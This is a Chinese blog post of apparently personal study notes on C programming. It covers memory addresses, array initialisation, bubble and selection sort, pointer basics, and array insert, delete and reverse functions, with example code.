<h2 id="内存地址"><a href="#内存地址" class="headerlink" title="内存地址"></a>内存地址</h2><p>以2GB内存地址为例，2GB = 2^31B，计算机就为这2^31个存储单元(字节)的位置编码：</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230814090918076.png" alt="image-20230814090918076"></p>
<p>地址编码对应的格式声明可以是<code>%p %o %x</code></p>
<p>举个例子吧，这个东西可以输出整型变量a的内存地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, &amp;a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230814091748449.png" alt="image-20230814091748449"></p>
<p>下面是定义数组的例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> d[<span class="number">3</span>];</span><br><span class="line">	d[<span class="number">0</span>] = <span class="number">1</span>; d[<span class="number">1</span>] = <span class="number">2</span>; d[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>,d[<span class="number">0</span>],d[<span class="number">1</span>],d[<span class="number">2</span>]);<span class="comment">//输出内容</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>, &amp;d[<span class="number">0</span>], &amp;d[<span class="number">1</span>], &amp;d[<span class="number">2</span>]);<span class="comment">//输出内存地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230814092030325.png" alt="image-20230814092030325"></p>
<p>一个整型变量是4个字节，通过观察内存地址，你可以看到，每一个内存地址相差的位数是4，也就是说数组的每一个元素的内存地址是紧挨着的。</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">2</span>*<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> c[<span class="number">2</span> * b]; <span class="comment">//这就是错误的</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义数组的方括号中，只能使用整型常量的表达式，不能带入变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">2</span>*<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">int</span> c[<span class="number">2</span> * b]; </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而上面这个就是正确的，因为这时候的b已经是一个常量了。</p>
<p>同时方括号中也不能是小数，只能是整型数据，当然使用<code>(int)</code>来转化为整型也是可以的。而且之前不是有那么多的看为整型数据的数据类型吗，比如说：<code>布尔类型，字符型</code>这些都是可以用来定义的。</p>
<h3 id="定义并初始化数组"><a href="#定义并初始化数组" class="headerlink" title="定义并初始化数组"></a>定义并初始化数组</h3><p>如果一个数组没有被初始化，那么他里面的东西都是垃圾值。下面展示一下初始化的方法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; % d&quot;</span>, a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面的花括号就是指定的里面的值，这种方式我们称之为完全初始化，也就是定义了每一个值。同时也可以这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;<span class="comment">//这里没有指定数组里面元素的个数</span></span><br><span class="line"><span class="comment">//所以计算机会根据你赋予的值来确定数组中元素的个数.</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; % d&quot;</span>, a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上面两个都是完全初始化，下面介绍一下非完全初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">4</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; % d&quot;</span>, a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是非完全初始化，其他没有赋值的元素的默认值就是0</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230814093551149.png" alt="image-20230814093551149"></p>
<h3 id="数组排序-冒泡"><a href="#数组排序-冒泡" class="headerlink" title="数组排序-冒泡"></a>数组排序-冒泡</h3><p>哈哈哈又到了经典的排序环节了哈。我估摸着就是冒泡排序吧，稍微看看，要是懂了的话，就写个例子差不多了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//排序五个数</span></span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">5</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;arr[i]);</span><br><span class="line">	&#125;<span class="comment">//上面就是循环接收五个数，</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//排序部分</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;<span class="comment">//n个数排序只需要循环冒泡n-1次</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span> - k; ++i) &#123;</span><br><span class="line">			<span class="comment">//这里的4-k意思就是第一次最大的拍到最后</span></span><br><span class="line">			<span class="comment">//第二次第二大的拍到倒数第二</span></span><br><span class="line">			<span class="keyword">int</span> b = arr[i];<span class="comment">//b是中间变量，方便我们交换数据</span></span><br><span class="line">			<span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;<span class="comment">//完成交换数据</span></span><br><span class="line">				b = arr[i+<span class="number">1</span>];</span><br><span class="line">				arr[i + <span class="number">1</span>]=arr[i];</span><br><span class="line">				arr[i] = b;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n继续输出结果\n&quot;</span>);</span><br><span class="line">	<span class="comment">//输出部分</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230814100721422.png" alt="image-20230814100721422"></p>
<p>接下来我大致讲讲冒泡排序吧，大概就是数组中，相邻的两个元素不断比较，大的那个放在右边，然后一直比较到倒数第二个，这样最大的值就被放在最右边了。</p>
<p>然后继续比较这次比较到倒数第三个，第二大的元素就被放在倒数第二个了。也就是说，比较n个数据，只需要循环n-1次冒泡排序。</p>
<p>某种意义上讲，直接不减k也是可以的，只不过会增加时间复杂度。</p>
<h3 id="数组排序-选择排序"><a href="#数组排序-选择排序" class="headerlink" title="数组排序-选择排序"></a>数组排序-选择排序</h3><p>幸好没跳过，原来还有个选择排序。</p>
<p>选择排序也是和冒泡排序是一样的，都是将最大的值放在最后一个，只不过选择排序是直接交换元素的位置到指定的位置。</p>
<p>举个例子，最大的数放在最右边，第二大的数直接放在倒数第二个。</p>
<p>下面我们写一个程序例子。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//排序五个数</span></span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">5</span>];</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;arr[i]);</span><br><span class="line">	&#125;<span class="comment">//上面就是循环接收五个数，</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//排序部分</span></span><br><span class="line">	<span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[c] &lt; arr[i])&#123;</span><br><span class="line">			c = i;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> buf = arr[c];</span><br><span class="line">	arr[c] = arr[len - <span class="number">1</span>];</span><br><span class="line">	arr[len - <span class="number">1</span>] = buf;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n继续输出结果\n&quot;</span>);</span><br><span class="line">	<span class="comment">//输出部分</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个只是完成了一次排序，也就是把最大值放到最右边去了，现在执行n-1次循环即可实现选择排序，相比这个，我还是更喜欢冒泡排序哈</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 排序五个数</span></span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环接收五个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 排序部分-选择排序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> max_index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; len - i; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[max_index]) &#123;</span><br><span class="line">                max_index = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> temp = arr[max_index];</span><br><span class="line">        arr[max_index] = arr[len - i - <span class="number">1</span>];</span><br><span class="line">        arr[len - i - <span class="number">1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n继续输出结果\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出部分</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在直接在上面那个的基础上套了一次循环，完成。</p>
<h2 id="指针-简单入门"><a href="#指针-简单入门" class="headerlink" title="指针-简单入门"></a>指针-简单入门</h2><p>指针就是一个变量的地址，我们可以通过这个地址来访问这个变量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span>* p;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">2</span>;</span><br><span class="line">	p = &amp;a;</span><br><span class="line">	*p = <span class="number">3</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们通过*p来访问了a变量的内存地址，将其赋值为3.</p>
<p>现在我们再继续写一个例子来帮助我们理解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> * p;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">3</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">	p = arr;</span><br><span class="line">	*p = <span class="number">10</span>;</span><br><span class="line">	*(p+<span class="number">1</span>) = <span class="number">20</span>;</span><br><span class="line">	*(p+<span class="number">2</span>) = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先需要说明两点，第一点就是p被创造是一个指针对象的时候，然后赋值的时候，就是<code>p=arr</code>那里，p的值当时是这个数组的第一个元素的内存地址。</p>
<p>第二点就是明明p只加了个1为什么能操作第二个和第三个元素呢？原因就是其实p加的是<code>1*sizeof(*p)</code>，因为*p又是一个int类型的数据，所以他的字节数就是4。</p>
<p>下面继续举个例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> * p;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">3</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">	p = arr;</span><br><span class="line">	<span class="comment">//*(p+2) =&gt; p[2]   =&gt; 2[p]这三个东西是等价的</span></span><br><span class="line">	p[<span class="number">2</span>] = <span class="number">300</span>;</span><br><span class="line">	p[<span class="number">1</span>] = <span class="number">200</span>;</span><br><span class="line">	<span class="number">0</span>[p] = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组的增删查改及倒置"><a href="#数组的增删查改及倒置" class="headerlink" title="数组的增删查改及倒置"></a>数组的增删查改及倒置</h2><h3 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h3><p>直接上例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义了一个函数，这个函数可以看到这个数组的有效元素的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">(<span class="keyword">int</span>* a)</span> </span>&#123;<span class="comment">//或者写成int a[LEN]</span></span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt; LEN) &#123;</span><br><span class="line">		<span class="keyword">if</span> (a[j] == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			++j;<span class="comment">//虽然j是索引，但是最后还是会多执行一个++j所以就变成了长度</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;<span class="comment">//输出这个数组的所有元素</span></span><br><span class="line">	<span class="keyword">int</span> len = length(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;数组中的元素是&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> index)</span> </span>&#123;<span class="comment">//定一个函数，删除对应index的元素</span></span><br><span class="line">	<span class="keyword">int</span> len = length(a);</span><br><span class="line">	<span class="keyword">if</span> (len == <span class="number">0</span> || index &gt; len - <span class="number">1</span>)<span class="comment">//看index是否超出长度或者len是不是0</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span><span class="comment">//具体要怎么删除呢，大概就是整体前移，然后最后一个赋值为0</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = index + <span class="number">1</span>; i &lt; len; ++i) &#123;</span><br><span class="line">			a[i - <span class="number">1</span>] = a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		a[len - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> index, <span class="keyword">int</span> value)</span> </span>&#123;<span class="comment">//定义一个函数用来插入变量</span></span><br><span class="line">	<span class="keyword">int</span> len = length(a);</span><br><span class="line">	<span class="keyword">if</span> (len == LEN || index&lt;<span class="number">0</span> || index&gt;len) &#123;<span class="comment">//检查索引超过没有，检查len是不是最大值，检查index是不是小于0</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= index; --i) &#123;<span class="comment">//就是每个元素往后面移动</span></span><br><span class="line">			a[i + <span class="number">1</span>] = a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//最后再在index那里赋值元素</span></span><br><span class="line">		a[index] = value;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[LEN] = &#123; <span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">15</span> &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;长度是：%d\n&quot;</span>,length(a));</span><br><span class="line">	show(a);</span><br><span class="line">	<span class="keyword">if</span> (del(a, <span class="number">4</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		show(a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除失败\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (insert(a, <span class="number">2</span>, <span class="number">8</span>)) &#123;<span class="comment">//下标为2的地方给他插入一个8的元素</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;插入成功&quot;</span>);</span><br><span class="line">		show(a);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;插入失败&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230816104043503.png" alt="image-20230816104043503"></p>
<p>成功输出。</p>
<h3 id="倒置"><a href="#倒置" class="headerlink" title="倒置"></a>倒置</h3><p>就是定义一个函数嘛，然后第一个和最后一个交换，倒数第二个和第二个交换，直到没有数组交换位置。</p>
<p>直接上例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义了一个函数，这个函数可以看到这个数组的有效元素的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">(<span class="keyword">int</span>* a)</span> </span>&#123;<span class="comment">//或者写成int a[LEN]</span></span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt; LEN) &#123;</span><br><span class="line">		<span class="keyword">if</span> (a[j] == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			++j;<span class="comment">//虽然j是索引，但是最后还是会多执行一个++j所以就变成了长度</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;<span class="comment">//输出这个数组的所有元素</span></span><br><span class="line">	<span class="keyword">int</span> len = length(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;数组中的元素是&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//写一个倒置数组的东西</span></span><br><span class="line">	<span class="keyword">int</span> arr[LEN] = &#123; <span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">15</span> &#125;;</span><br><span class="line">	show(arr);</span><br><span class="line">	<span class="keyword">int</span> len = length(arr);</span><br><span class="line">	<span class="keyword">int</span> from = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> end = len - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> buf;</span><br><span class="line">	<span class="keyword">while</span> (from &lt; end) &#123;</span><br><span class="line">		buf = arr[from];</span><br><span class="line">		arr[from] = arr[end];</span><br><span class="line">		arr[end] = buf;</span><br><span class="line">		++from;</span><br><span class="line">		--end;</span><br><span class="line">		&#125;</span><br><span class="line">	show(arr);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230816111738974.png" alt="image-20230816111738974"></p>
<h3 id="查找位置"><a href="#查找位置" class="headerlink" title="查找位置"></a>查找位置</h3><p>就是找到一个元素的索引</p>
<p>大概思路就是，一直用一个j来for循环，当<code>arr[j]==value</code>的时候，就输出这个就可以了，现在给出一个例子。</p>
<p>当然查找的时候也可以使用二分法查找</p>
